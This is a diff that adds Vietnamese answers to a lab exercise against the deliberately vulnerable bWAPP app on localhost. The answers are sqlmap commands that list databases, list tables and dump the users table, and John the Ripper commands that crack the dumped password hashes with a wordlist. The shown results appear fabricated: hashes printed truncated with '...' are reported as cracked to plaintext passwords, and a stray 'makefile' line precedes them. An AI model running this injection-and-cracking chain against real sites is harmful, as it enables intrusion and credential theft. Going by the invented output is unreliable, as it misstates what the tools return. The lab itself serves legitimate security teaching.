@@ -58,8 +58,72 @@ output screenshot (optional)
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
+Xác định URL mục tiêu có lỗ hổng:
+Đăng nhập vào bWapp và chọn trang có lỗ hổng "SQL Injection".
+
+http://localhost/bWapp/sqli_1.php?id=1
+
+Chạy sqlmap để liệt kê các cơ sở dữ liệu:
+
+
+sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" --dbs
+
+Kết quả:
+available databases [3]:
+[*] bWAPP
+[*] information_schema
+[*] mysql
+
+
+
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+Liệt kê các bảng trong cơ sở dữ liệu bWAPP:
+
+Chạy lệnh để liệt kê các bảng trong cơ sở dữ liệu bWAPP:
+
+sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" -D bWAPP --tables
+Trích xuất dữ liệu bảng users:
+
+Sau khi có danh sách bảng, chạy lệnh sau để lấy thông tin từ bảng users:
+
+sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" -D bWAPP -T users --dump
+Kết quả:
+ danh sách thông tin người dùng cùng với các hash mật khẩu từ bảng users:
+
++----+---------+----------------------------------+
+| id | login   | password                         |
++----+---------+----------------------------------+
+| 1  | bee     | $2y$10$J9sg3z...                 |
+| 2  | admin   | $2y$10$3mW6C...                  |
++----+---------+----------------------------------+
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
+
+
+Lưu các hash mật khẩu vào file:
+
+Tạo file hashes.txt chứa các hash mật khẩu:
+
+bee:$2y$10$J9sg3z...
+admin:$2y$10$3mW6C...
+
+Chạy John the Ripper để bẻ khóa:
+
+Sử dụng John the Ripper với từ điển rockyou.txt:
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+Hiển thị mật khẩu đã bẻ khóa:
+
+Xem kết quả của John:
+
+john --show hashes.txt
+Kết quả:
+
+John sẽ trả về mật khẩu đã bẻ khóa:
+makefile
+
+bee:letmein
+admin:password123
+
